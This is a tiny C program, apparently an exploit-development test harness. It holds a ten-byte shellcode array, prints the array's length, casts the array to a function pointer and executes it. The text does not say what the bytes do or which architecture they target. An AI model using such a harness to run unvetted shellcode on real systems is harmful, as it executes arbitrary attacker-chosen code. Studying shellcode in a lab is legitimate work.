#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
"\x01\x08\x18\xff\xff\xff\x4e\x9f\x42\x7b";
main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
